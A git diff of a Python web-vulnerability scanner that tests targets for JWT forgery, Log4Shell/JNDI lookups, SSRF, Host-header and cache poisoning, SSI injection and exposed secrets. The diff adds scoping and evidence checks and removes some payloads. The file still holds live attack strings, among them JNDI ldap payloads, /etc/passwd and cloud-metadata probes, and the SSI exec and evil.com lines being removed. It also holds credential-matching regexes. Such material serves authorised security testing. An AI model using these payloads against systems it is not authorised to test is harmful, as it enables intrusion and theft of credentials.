-                            'severity': 'MEDIUM',
-                            'category': 'GRAPHQL_ATTACK'
+                            'reason': ('Query batching is supported; rate-limit or '
+                                       'resource impact has not been demonstrated'),
+                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         print(f"  [!] GraphQL Batching enabled at {endpoint}")
@@ -7047,23 +8194,25 @@ class CloudFrontBypasser(ExtraTechniques):
             
             # Test depth limit
             try:
-                resp = self._session.post(
-                    url,
+                resp = self._scoped_safe_request(
+                    url, method='POST',
                     json={'query': depth_query},
                     headers={'Content-Type': 'application/json'},
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     if 'errors' not in resp.text.lower() or 'depth' not in resp.text.lower():
                         result = {
                             'technique': f'GraphQL Depth Bypass: {endpoint}',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': 'No depth limit enforced - nested query DoS possible',
-                            'severity': 'MEDIUM',
-                            'category': 'GRAPHQL_ATTACK'
+                            'reason': ('Nested query was accepted; no measured resource '
+                                       'exhaustion or policy bypass was demonstrated'),
+                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         
@@ -7082,8 +8231,8 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # Get a sample response to find JWT tokens
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             # Look for JWTs in response
@@ -7139,7 +8288,6 @@ class CloudFrontBypasser(ExtraTechniques):
             ('kid_sqli', '{"alg":"HS256","typ":"JWT","kid":"key\' OR \'1\'=\'1"}'),
             ('kid_traversal', '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}'),
             ('kid_devnull', '{"alg":"HS256","typ":"JWT","kid":"/dev/null"}'),
-            ('kid_rce', '{"alg":"HS256","typ":"JWT","kid":"| whoami"}'),
         ]
         
         for name, header_json in kid_injections:
@@ -7148,12 +8296,12 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # JKU/X5U injection (SSRF via JWT)
         jku_header = base64.urlsafe_b64encode(
-            b'{"alg":"RS256","typ":"JWT","jku":"http://evil.com/jwks.json"}'
+            b'{"alg":"RS256","typ":"JWT","jku":"https://blackthorn.invalid/jwks.json"}'
         ).decode().rstrip('=')
         jwt_attacks.append(('jku_ssrf', f"{jku_header}.{none_payload}."))
         
         x5u_header = base64.urlsafe_b64encode(
-            b'{"alg":"RS256","typ":"JWT","x5u":"http://evil.com/cert.pem"}'
+            b'{"alg":"RS256","typ":"JWT","x5u":"https://blackthorn.invalid/cert.pem"}'
         ).decode().rstrip('=')
         jwt_attacks.append(('x5u_ssrf', f"{x5u_header}.{none_payload}."))
         
@@ -7171,27 +8319,35 @@ class CloudFrontBypasser(ExtraTechniques):
                         'Cookie': f'token={jwt_token}; jwt={jwt_token}'
                     }
                     
-                    resp = safe_request(
-                        f"{self.target}{endpoint}",
-                        timeout=self.timeout,
-                        headers=headers
+                    result = self._test_request(
+                        headers=headers, path=endpoint,
+                        technique=f'JWT attack: {attack_name}',
+                        probe={
+                            'category': 'JWT_ATTACK',
+                            'payload': f'Bearer {jwt_token}',
+                            'insertion_point': {
+                                'type': 'header', 'name': 'Authorization',
+                            },
+                            'detector_id': 'jwt-invalid-forged-auth-transition-v2',
+                            'control': {
+                                'method': 'GET', 'path': endpoint,
+                                'headers': {
+                                    'Authorization': 'Bearer blackthorn.invalid.token',
+                                    'Cookie': ('token=blackthorn.invalid.token; '
+                                               'jwt=blackthorn.invalid.token'),
+                                },
+                                'data': None,
+                            },
+                        },
                     )
-                    
-                    if resp and resp.status_code in [200, 201]:
-                        # Check if we got authenticated
-                        if any(x in resp.text.lower() for x in ['admin', 'user', 'profile', 'dashboard']):
-                            severity = 'CRITICAL' if 'none' in attack_name.lower() else 'HIGH'
-                            result = {
-                                'technique': f'JWT Attack: {attack_name}',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': f'JWT accepted at {endpoint}',
-                                'severity': severity,
-                                'category': 'JWT_ATTACK'
-                            }
-                            results.append(result)
-                            print(f"  [✓] JWT Attack: {attack_name} successful")
-                            break
+                    if (self._result_has_evidence(result, 'blocked_to_allowed')
+                            and (result.get('baseline') or {}).get('status') in (401, 403)):
+                        result['severity'] = (
+                            'CRITICAL' if 'none' in attack_name.lower() else 'HIGH'
+                        )
+                        results.append(result)
+                        print(f"  [✓] JWT auth boundary bypass: {attack_name}")
+                        break
                             
                 except Exception as e:
                     logger.debug(f"JWT attack error: {e}")
@@ -7236,9 +8392,9 @@ class CloudFrontBypasser(ExtraTechniques):
                 try:
                     # First request - potentially cached
                     url = f"{self.target}{endpoint}{suffix}"
-                    resp1 = safe_request(url, timeout=self.timeout, allow_redirects=False)
+                    resp1 = self._scoped_safe_request(url, timeout=self.timeout, allow_redirects=False)
                     
-                    if resp1 and resp1.status_code == 200:
+                    if resp1 is not None and resp1.status_code == 200:
                         # Check cache headers
                         cache_control = resp1.headers.get('Cache-Control', '').lower()
                         x_cache = resp1.headers.get('X-Cache', '').lower()
@@ -7282,7 +8438,7 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # Test cache key poisoning via unkeyed headers
         poison_headers = [
-            {'X-Forwarded-Host': 'evil.com'},
+            {'X-Forwarded-Host': 'blackthorn.invalid'},
             {'X-Original-URL': '/admin'},
             {'X-Rewrite-URL': '/admin'},
             {'X-Forwarded-Scheme': 'nothttps'},
@@ -7290,13 +8446,13 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for headers in poison_headers:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}/?cb={int(time.time())}",
                     timeout=self.timeout,
                     headers=headers
                 )
                 
-                if resp:
+                if resp is not None:
                     header_name = list(headers.keys())[0]
                     header_value = list(headers.values())[0]
                     
@@ -7318,7 +8474,7 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_log4shell_patterns(self) -> List[Dict[str, Any]]:
-        """Test for Log4Shell (CVE-2021-44228) and similar JNDI injection patterns"""
+        """Look for new JNDI diagnostics; OOB is required for confirmation."""
         results = []
         print("  [*] Testing Log4Shell/JNDI injection patterns...")
         
@@ -7346,6 +8502,22 @@ class CloudFrontBypasser(ExtraTechniques):
             # Unicode variations
             '${jn${::-d}i:ldap://test.com/a}',
         ]
+        invalid_domain = f"blackthorn-{random.randrange(10**8, 10**9)}.invalid"
+        # Never direct callbacks at an unowned third-party domain. The reserved
+        # .invalid name is diagnostic-only; configured OOB probes run separately.
+        jndi_payloads = [p.replace('test.com', invalid_domain) for p in jndi_payloads]
+        diagnostic_oracle = {
+            'type': 'regex',
+            'patterns': [
+                r'javax\.naming\.(?:communication|naming)exception',
+                r'(?:name not found|unknown host|no initial context)exception',
+                r'jndi lookup failed', r'ldap connection (?:failed|refused)',
+            ],
+            'severity': 'HIGH', 'confidence': 'medium',
+            'verification_status': 'candidate', 'kind': 'suspected',
+            'reason': ('A JNDI-specific backend diagnostic appeared only after '
+                       'the probe; use correlated OOB to confirm Log4Shell'),
+        }
         
         # Injection points
         injection_vectors = [
@@ -7359,33 +8531,22 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for payload in jndi_payloads[:6]:  # Limit payloads
             encoded_payload = quote(payload)
-            
-            # Test in query parameter
+
             try:
-                resp = safe_request(
-                    f"{self.target}/?test={encoded_payload}",
-                    timeout=self.timeout
+                result = self._test_request(
+                    path=f'/?test={encoded_payload}',
+                    technique='Log4Shell/JNDI diagnostic: query parameter',
+                    probe={
+                        'category': 'LOG4SHELL', 'payload': payload,
+                        'parameter': 'test',
+                        'insertion_point': {'type': 'query', 'name': 'test'},
+                        'detector_id': 'log4shell-diagnostic-v2',
+                        'oracle': diagnostic_oracle,
+                    },
                 )
-                
-                if resp and resp.status_code in [200, 500, 502, 503]:
-                    # Check for error indicators that might suggest JNDI lookup attempt
-                    error_indicators = [
-                        'jndi', 'lookup', 'naming', 'javax.naming',
-                        'connection refused', 'unknown host', 'timeout'
-                    ]
-                    
-                    if any(ind in resp.text.lower() for ind in error_indicators):
-                        result = {
-                            'technique': f'Log4Shell: Query Parameter',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'JNDI lookup indicators in response',
-                            'severity': 'CRITICAL',
-                            'category': 'LOG4SHELL'
-                        }
-                        results.append(result)
-                        print(f"  [✓] CRITICAL: Potential Log4Shell in query param")
-                        break
+                if self._result_has_evidence(result, 'response_signature'):
+                    results.append(result)
+                    print("  [!] Log4Shell candidate in query parameter")
                         
             except Exception as e:
                 logger.debug(f"Log4Shell query test error: {e}")
@@ -7394,46 +8555,38 @@ class CloudFrontBypasser(ExtraTechniques):
             for vector_name, header_name in injection_vectors[1:]:
                 try:
                     headers = {header_name: payload}
-                    resp = safe_request(
-                        self.target,
-                        timeout=self.timeout,
-                        headers=headers
+                    result = self._test_request(
+                        headers=headers, path='/',
+                        technique=f'Log4Shell/JNDI diagnostic: {header_name}',
+                        probe={
+                            'category': 'LOG4SHELL', 'payload': payload,
+                            'insertion_point': {'type': 'header', 'name': header_name},
+                            'detector_id': 'log4shell-diagnostic-v2',
+                            'oracle': diagnostic_oracle,
+                        },
                     )
-                    
-                    if resp and resp.status_code in [200, 500, 502, 503]:
-                        if any(ind in resp.text.lower() for ind in ['jndi', 'lookup', 'naming']):
-                            result = {
-                                'technique': f'Log4Shell: {header_name}',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': f'JNDI indicators via {header_name}',
-                                'severity': 'CRITICAL',
-                                'category': 'LOG4SHELL'
-                            }
-                            results.append(result)
-                            print(f"  [✓] CRITICAL: Potential Log4Shell in {header_name}")
+                    if self._result_has_evidence(result, 'response_signature'):
+                        results.append(result)
+                        print(f"  [!] Log4Shell candidate in {header_name}")
                             
                 except Exception as e:
                     logger.debug(f"Log4Shell header test error: {e}")
         
         # Test POST body
         try:
-            resp = self._session.post(
-                self.target,
-                data={'test': '${jndi:ldap://test.com/a}'},
-                timeout=self.timeout,
-                verify=False
+            payload = f'${{jndi:ldap://{invalid_domain}/a}}'
+            result = self._test_request(
+                method='POST', path='/', data=urlencode({'test': payload}),
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                technique='Log4Shell/JNDI diagnostic: POST body',
+                probe={
+                    'category': 'LOG4SHELL', 'payload': payload,
+                    'insertion_point': {'type': 'form-body', 'name': 'test'},
+                    'detector_id': 'log4shell-diagnostic-v2',
+                    'oracle': diagnostic_oracle,
+                },
             )
-            
-            if resp and 'jndi' in resp.text.lower():
-                result = {
-                    'technique': 'Log4Shell: POST Body',
-                    'bypass': True,
-                    'status': resp.status_code,
-                    'reason': 'JNDI indicators in POST response',
-                    'severity': 'CRITICAL',
-                    'category': 'LOG4SHELL'
-                }
+            if self._result_has_evidence(result, 'response_signature'):
                 results.append(result)
                 
         except Exception as e:
@@ -7472,7 +8625,7 @@ class CloudFrontBypasser(ExtraTechniques):
             ('netdoc:///etc/passwd', 'Netdoc'),
             
             # Jar protocol (Java)
-            ('jar:http://evil.com/test.jar!/test.txt', 'Jar'),
+            ('jar:http://blackthorn.invalid/test.jar!/test.txt', 'Jar'),
             
             # PHP wrappers
             ('php://filter/convert.base64-encode/resource=/etc/passwd', 'PHP Filter'),
@@ -7482,7 +8635,6 @@ class CloudFrontBypasser(ExtraTechniques):
             
             # Cloud metadata (various formats)
             ('http://[::ffff:169.254.169.254]/', 'IPv6 mapped metadata'),
-            ('http://169.254.169.254.xip.io/', 'DNS rebind metadata'),
             ('http://0x7f000001/', 'Hex localhost'),
             ('http://0177.0.0.1/', 'Octal localhost'),
             ('http://2130706433/', 'Decimal localhost'),
@@ -7498,12 +8650,12 @@ class CloudFrontBypasser(ExtraTechniques):
                     encoded_payload = quote(payload, safe='')
                     
                     # Test GET
-                    resp = safe_request(
+                    resp = self._scoped_safe_request(
                         f"{self.target}/?{param}={encoded_payload}",
                         timeout=self.timeout + 3
                     )
                     
-                    if resp:
+                    if resp is not None:
                         # Check for successful protocol access indicators
                         indicators = [
                             'root:', 'daemon:', '[extensions]',  # File access
@@ -7545,25 +8697,25 @@ class CloudFrontBypasser(ExtraTechniques):
         # Host header attack payloads
         host_attacks = [
             # Basic host injection
-            {'Host': 'evil.com'},
-            {'Host': f'{self.domain}@evil.com'},
-            {'Host': f'{self.domain}:evil.com'},
-            {'Host': f'evil.com#{self.domain}'},
+            {'Host': 'blackthorn.invalid'},
+            {'Host': f'{self.domain}@blackthorn.invalid'},
+            {'Host': f'{self.domain}:blackthorn.invalid'},
+            {'Host': f'blackthorn.invalid#{self.domain}'},
             
             # X-Forwarded-Host attacks
-            {'X-Forwarded-Host': 'evil.com'},
-            {'X-Host': 'evil.com'},
-            {'X-Forwarded-Server': 'evil.com'},
+            {'X-Forwarded-Host': 'blackthorn.invalid'},
+            {'X-Host': 'blackthorn.invalid'},
+            {'X-Forwarded-Server': 'blackthorn.invalid'},
             
             # Double Host header
             # Note: requests library doesn't support this easily
             
             # Absolute URL override
-            {'Host': self.domain, 'X-Original-URL': 'http://evil.com/'},
+            {'Host': self.domain, 'X-Original-URL': 'http://blackthorn.invalid/'},
             
             # Port injection
-            {'Host': f'{self.domain}:443@evil.com'},
-            {'Host': f'{self.domain}:evil.com:80'},
+            {'Host': f'{self.domain}:443@blackthorn.invalid'},
+            {'Host': f'{self.domain}:blackthorn.invalid:80'},
         ]
         
         # Test on reset endpoints
@@ -7571,26 +8723,51 @@ class CloudFrontBypasser(ExtraTechniques):
             for attack_headers in host_attacks[:5]:
                 try:
                     # Try POST request (common for password reset)
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
-                        data={'email': 'test@test.com'},
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
+                        data={'email': 'blackthorn-probe@example.invalid'},
                         headers=attack_headers,
                         timeout=self.timeout,
                         verify=False,
                         allow_redirects=False
                     )
                     
-                    if resp:
-                        # Check if evil.com appears in response (link poisoning)
-                        if 'evil.com' in resp.text or 'evil.com' in resp.headers.get('Location', ''):
+                    if resp is not None:
+                        # Exact controlled-host reflection is a candidate for link poisoning.
+                        if ('blackthorn.invalid' in resp.text or
+                                'blackthorn.invalid' in resp.headers.get('Location', '')):
                             attack_type = list(attack_headers.keys())[0]
                             result = {
-                                'technique': f'Host Header Poison: {attack_type}',
+                                'technique': f'Host-derived link candidate: {attack_type}',
                                 'bypass': True,
                                 'status': resp.status_code,
-                                'reason': f'Attacker host reflected at {endpoint}',
-                                'severity': 'HIGH',
-                                'category': 'HOST_HEADER_ATTACK'
+                                'reason': (f'Controlled host was reflected at {endpoint}; '
+                                           'a delivered reset link or cached response was not proven'),
+                                'severity': 'MEDIUM',
+                                'category': 'HOST_HEADER_ATTACK',
+                                'kind': 'suspected',
+                                'verification_status': 'candidate',
+                                'confidence': 'medium',
+                                'method': 'POST', 'path': endpoint,
+                                'url': f'{self.target}{endpoint}',
+                                'headers': dict(attack_headers),
+                                'request': {
+                                    'method': 'POST', 'path': endpoint,
+                                    'url': f'{self.target}{endpoint}',
+                                    'headers': dict(attack_headers),
+                                    'body': {'email': 'blackthorn-probe@example.invalid'},
+                                },
+                                'response': {
+                                    'status': resp.status_code,
+                                    'headers': {'location': resp.headers.get('Location', '')},
+                                    'excerpt': resp.text[:300],
+                                },
+                                'evidence': [{
+                                    'type': 'controlled_host_reflection',
+                                    'description': 'Controlled .invalid host appeared in response',
+                                    'matched': 'blackthorn.invalid',
+                                }],
+                                '_no_reconfirm': True,
                             }
                             results.append(result)
                             print(f"  [✓] Host Header Poison at {endpoint}")
@@ -7602,24 +8779,47 @@ class CloudFrontBypasser(ExtraTechniques):
         internal_hosts = ['localhost', '127.0.0.1', 'internal', 'admin.internal', '10.0.0.1']
         for internal_host in internal_hosts:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     self.target,
                     timeout=self.timeout,
                     headers={'Host': internal_host}
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     if len(resp.content) != self._baseline_size:
                         result = {
-                            'technique': f'Host Routing Bypass: {internal_host}',
+                            'technique': f'Virtual-host routing candidate: {internal_host}',
                             'bypass': True,
                             'status': resp.status_code,
-                            'reason': 'Different content with internal host',
+                            'reason': ('Host override returned different content; access to a '
+                                       'protected internal application is not proven'),
                             'severity': 'MEDIUM',
-                            'category': 'HOST_HEADER_ATTACK'
+                            'category': 'HOST_HEADER_ATTACK',
+                            'kind': 'suspected',
+                            'verification_status': 'candidate',
+                            'confidence': 'low',
+                            'method': 'GET', 'path': '/', 'url': self.target,
+                            'headers': {'Host': internal_host},
+                            'request': {
+                                'method': 'GET', 'path': '/', 'url': self.target,
+                                'headers': {'Host': internal_host}, 'body': None,
+                            },
+                            'response': {'status': resp.status_code,
+                                         'size': len(resp.content)},
+                            'comparison': {
+                                'size_delta': (len(resp.content) -
+                                               int(self._baseline_size or 0)),
+                                'control_scope': 'root',
+                            },
+                            'evidence': [{
+                                'type': 'virtual_host_response_delta',
+                                'description': 'Host override changed response size',
+                                'matched': str(len(resp.content)),
+                            }],
+                            '_no_reconfirm': True,
                         }
                         results.append(result)
-                        print(f"  [!] Routing bypass with Host: {internal_host}")
+                        print(f"  [!] Virtual-host routing candidate: {internal_host}")
                         
             except Exception as e:
                 logger.debug(f"Host routing error: {e}")
@@ -7627,72 +8827,42 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_ssi_injection(self) -> List[Dict[str, Any]]:
-        """Server-Side Includes (SSI) injection testing"""
+        """Detect SSI execution with a harmless randomized output canary."""
         results = []
         print("  [*] Testing SSI injection...")
-        
-        ssi_payloads = [
-            # Command execution
-            ('<!--#exec cmd="id"-->', 'exec cmd'),
-            ('<!--#exec cmd="whoami"-->', 'exec whoami'),
-            ('<!--#exec cgi="/bin/ls"-->', 'exec cgi'),
-            
-            # File inclusion
-            ('<!--#include virtual="/etc/passwd"-->', 'include passwd'),
-            ('<!--#include file="/etc/passwd"-->', 'include file'),
-            ('<!--#include virtual="/.htpasswd"-->', 'include htpasswd'),
-            
-            # Echo variables
-            ('<!--#echo var="DOCUMENT_ROOT"-->', 'echo docroot'),
-            ('<!--#echo var="SERVER_SOFTWARE"-->', 'echo server'),
-            ('<!--#echo var="DATE_LOCAL"-->', 'echo date'),
-            
-            # Config
-            ('<!--#config errmsg="SSI_VULNERABLE"-->', 'config errmsg'),
-            ('<!--#config timefmt="%Y"-->', 'config timefmt'),
-            
-            # Printenv
-            ('<!--#printenv-->', 'printenv'),
-            
-            # Flastmod
-            ('<!--#flastmod file="index.html"-->', 'flastmod'),
-            
-            # Encoded variations
-            ('%3C!--#exec%20cmd=%22id%22--%3E', 'encoded exec'),
-        ]
+        marker = f'BTSSI-{random.randrange(10**8, 10**9)}'
+        payload = f'<!--#exec cmd="printf {marker}"-->'
         
         # Common SSI-enabled extensions
         ssi_extensions = ['.shtml', '.stm', '.shtm', '.html']
         
-        for payload, technique in ssi_payloads:
-            for ext in ssi_extensions:
-                try:
-                    encoded_payload = quote(payload)
-                    
-                    # Test in query parameter
-                    resp = safe_request(
-                        f"{self.target}/test{ext}?input={encoded_payload}",
-                        timeout=self.timeout
-                    )
-                    
-                    if resp:
-                        # Check for SSI execution indicators
-                        indicators = ['uid=', 'root:', 'www-data', 'apache', 'SSI_VULNERABLE', '/var/www']
-                        
-                        if any(ind in resp.text for ind in indicators):
-                            result = {
-                                'technique': f'SSI Injection: {technique}',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': 'SSI command executed',
-                                'severity': 'CRITICAL',
-                                'category': 'SSI_INJECTION'
-                            }
-                            results.append(result)
-                            print(f"  [✓] CRITICAL: SSI Injection ({technique})")
-                            
-                except Exception as e:
-                    logger.debug(f"SSI test error: {e}")
+        for ext in ssi_extensions:
+            try:
+                path = f"/test{ext}?input={quote(payload)}"
+                result = self._test_request(
+                    path=path, technique=f'SSI execution canary ({ext})',
+                    probe={
+                        'category': 'SSI_INJECTION', 'payload': payload,
+                        'parameter': 'input',
+                        'insertion_point': {'type': 'query', 'name': 'input'},
+                        'detector_id': 'ssi-execution-marker-v3',
+                        'control': {
+                            'method': 'GET',
+                            'path': f'/test{ext}?input=blackthorn-control',
+                            'headers': {}, 'data': None,
+                        },
+                        'oracle': {
+                            'type': 'marker', 'value': marker, 'payload': payload,
+                            'severity': 'HIGH',
+                            'reason': 'SSI executed the harmless printf canary',
+                        },
+                    },
+                )
+                if self._result_has_evidence(result, 'execution_marker'):
+                    results.append(result)
+                    print(f"  [✓] HIGH: SSI execution confirmed ({ext})")
+            except Exception as e:
+                logger.debug(f"SSI test error: {e}")
         
         return results
     
@@ -7703,8 +8873,9 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # API key patterns (regex)
         secret_patterns = {
-            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
-            'AWS Secret Key': r'[0-9a-zA-Z/+]{40}',
+            'AWS Access Key': r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b',
+            'AWS Secret Key': (r'''(?ix)\b(?:aws_)?secret_access_key\b\s*[:=]\s*'''
+                               r'''["']?[0-9A-Za-z/+=]{40}["']?'''),
             'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
             'GitHub OAuth': r'gho_[0-9a-zA-Z]{36}',
             'GitLab Token': r'glpat-[0-9a-zA-Z\-]{20}',
@@ -7723,7 +8894,6 @@ class CloudFrontBypasser(ExtraTechniques):
             'SendGrid': r'SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}',
             'Mailgun': r'key-[0-9a-zA-Z]{32}',
             'Mailchimp': r'[0-9a-f]{32}-us[0-9]{1,2}',
-            'Heroku API': r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
             'DigitalOcean': r'dop_v1_[a-f0-9]{64}',
             'NPM Token': r'npm_[A-Za-z0-9]{36}',
             'Discord Token': r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}',
@@ -7737,9 +8907,9 @@ class CloudFrontBypasser(ExtraTechniques):
             'Basic Auth': r'[Aa]uthorization:\s*[Bb]asic\s+[A-Za-z0-9+/=]+',
             'Bearer Token': r'[Bb]earer\s+[A-Za-z0-9_\-\.]+',
             'Password in URL': r'[a-zA-Z]{3,10}://[^/\s:@]+:[^/\s:@]+@[^/\s:@]+',
-            'MongoDB URI': r'mongodb(\+srv)?://[^\s<>"]+',
-            'PostgreSQL URI': r'postgres(ql)?://[^\s<>"]+',
-            'MySQL URI': r'mysql://[^\s<>"]+',
+            'MongoDB URI': r'mongodb(?:\+srv)?://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
+            'PostgreSQL URI': r'postgres(?:ql)?://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
+            'MySQL URI': r'mysql://[^\s<>"/:]+:[^\s<>"/@]+@[^\s<>"]+',
         }
         
         # Endpoints likely to expose secrets
@@ -7750,35 +8920,75 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         compiled_patterns = {name: re.compile(pattern) for name, pattern in secret_patterns.items()}
+        seen_secret_hashes = set()
         
         for endpoint in sensitive_endpoints:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}{endpoint}",
                     timeout=self.timeout,
                     allow_redirects=True
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     content = resp.text
                     
                     for secret_name, pattern in compiled_patterns.items():
-                        matches = pattern.findall(content)
-                        if matches:
-                            # Mask the secret
-                            masked = matches[0][:10] + '...' if len(matches[0]) > 10 else matches[0]
-                            
+                        for match in pattern.finditer(content):
+                            matched_text = match.group(0)
+                            lowered = matched_text.lower()
+                            if any(word in lowered for word in (
+                                'example', 'replace-me', 'replace_me', 'your-token',
+                                'your_key', 'xxxxxxxx', '<redacted>',
+                            )):
+                                continue
+                            digest = hashlib.sha256(matched_text.encode()).hexdigest()
+                            if digest in seen_secret_hashes:
+                                continue
+                            seen_secret_hashes.add(digest)
+                            masked = (matched_text[:8] + '...' + matched_text[-4:]
+                                      if len(matched_text) > 16 else '<masked>')
+                            confirmed_material = secret_name == 'Private Key'
+                            severity = ('MEDIUM' if secret_name in {
+                                'JWT Token', 'Basic Auth', 'Bearer Token',
+                            } else 'HIGH')
+                            reason = (f'{secret_name} material found at {endpoint}: {masked}. '
+                                      + ('The private-key header is direct exposure evidence.'
+                                         if confirmed_material else
+                                         'Validity and privileges were not tested.'))
                             result = {
                                 'technique': f'Exposed Secret: {secret_name}',
                                 'bypass': True,
                                 'status': resp.status_code,
-                                'reason': f'Found at {endpoint}: {masked}',
-                                'severity': 'CRITICAL',
+                                'reason': reason,
+                                'severity': severity,
                                 'category': 'API_KEY_EXPOSURE',
-                                'details': {'endpoint': endpoint, 'type': secret_name}
+                                'kind': 'finding' if confirmed_material else 'suspected',
+                                'verification_status': ('confirmed' if confirmed_material
+                                                        else 'candidate'),
+                                'confidence': 'high' if confirmed_material else 'medium',
+                                'method': 'GET', 'path': endpoint,
+                                'url': f'{self.target}{endpoint}',
+                                'request': {
+                                    'method': 'GET', 'path': endpoint,
+                                    'url': f'{self.target}{endpoint}',
+                                    'headers': {}, 'body': None,
+                                },
+                                'response': {
+                                    'status': resp.status_code,
+                                    'content_type': resp.headers.get('Content-Type', ''),
+                                },
+                                'evidence': [{
+                                    'type': 'secret_signature',
+                                    'description': reason,
+                                    'matched': masked,
+                                }],
+                                'details': {'endpoint': endpoint, 'type': secret_name},
+                                '_no_reconfirm': True,
                             }
                             results.append(result)
-                            print(f"  [✓] CRITICAL: {secret_name} exposed at {endpoint}")
+                            print(f"  [{'✓' if confirmed_material else '!'}] "
+                                  f"{secret_name} material at {endpoint}")
                             
             except Exception as e:
                 logger.debug(f"API key scan error: {e}")
@@ -7867,24 +9077,22 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Testing extended verb tampering...")
         
         # Extended HTTP methods
+        # Read-only/discovery methods only. Collection creation, write, move,
+        # lock, purge, and tunnel methods are not safe to guess at `/`.
         methods = [
-            'TRACE', 'TRACK', 'DEBUG', 'CONNECT',
-            'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK',  # WebDAV
-            'SEARCH', 'PATCH', 'PURGE', 'LINK', 'UNLINK',
-            'VIEW', 'CHECKOUT', 'CHECKIN', 'REPORT', 'VERSION-CONTROL',
-            'ARBITRARY', 'FAKE', 'TEST',  # Custom methods
+            'TRACE', 'TRACK', 'DEBUG', 'OPTIONS', 'PROPFIND', 'SEARCH',
+            'VIEW', 'REPORT', 'ARBITRARY', 'FAKE', 'TEST',
         ]
         
         for method in methods:
             try:
-                resp = self._session.request(
-                    method,
-                    self.target,
+                resp = self._scoped_safe_request(
+                    self.target, method=method,
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp:
+                if resp is not None:
                     # TRACE/TRACK can lead to XST (Cross-Site Tracing)
                     if method in ['TRACE', 'TRACK'] and resp.status_code == 200:
                         if 'TRACE' in resp.text or method in resp.text:
@@ -7893,8 +9101,17 @@ class CloudFrontBypasser(ExtraTechniques):
                                 'bypass': True,
                                 'status': resp.status_code,
                                 'reason': f'{method} method enabled - XST possible',
-                                'severity': 'MEDIUM',
-                                'category': 'VERB_TAMPERING'
+                                'severity': 'LOW',
+                                'category': 'VERB_TAMPERING',
+                                'kind': 'suspected',
+                                'verification_status': 'candidate',
+                                'confidence': 'medium',
+                                'method': method, 'path': '/', 'url': self.target,
+                                'evidence': [{
+                                    'type': 'trace_echo',
+                                    'description': f'{method} echoed request material',
+                                    'matched': method,
+                                }],
                             }
                             results.append(result)
                             print(f"  [!] XST: {method} enabled")
@@ -7914,14 +9131,16 @@ class CloudFrontBypasser(ExtraTechniques):
                             print(f"  [!] DEBUG method enabled")
                     
                     # WebDAV methods
-                    elif method in ['PROPFIND', 'MKCOL', 'COPY', 'MOVE'] and resp.status_code in [200, 207, 201]:
+                    elif method == 'PROPFIND' and resp.status_code in [200, 207]:
                         result = {
                             'technique': f'WebDAV: {method}',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': f'WebDAV {method} method enabled',
-                            'severity': 'MEDIUM',
-                            'category': 'VERB_TAMPERING'
+                            'reason': 'Read-only WebDAV discovery method is enabled',
+                            'severity': 'INFO',
+                            'category': 'VERB_TAMPERING',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         print(f"  [!] WebDAV: {method} enabled")
@@ -7930,11 +9149,14 @@ class CloudFrontBypasser(ExtraTechniques):
                     elif method in ['ARBITRARY', 'FAKE', 'TEST'] and resp.status_code not in [400, 405, 501]:
                         result = {
                             'technique': f'Custom Method: {method}',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': f'Server accepts arbitrary HTTP method',
-                            'severity': 'LOW',
-                            'category': 'VERB_TAMPERING'
+                            'reason': ('Server returned a non-rejection response for an arbitrary '
+                                       'method; no authorization or state impact was shown'),
+                            'severity': 'INFO',
+                            'category': 'VERB_TAMPERING',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         
@@ -7976,14 +9198,14 @@ class CloudFrontBypasser(ExtraTechniques):
         for range_header, technique in range_attacks:
             try:
                 start_time = time.time()
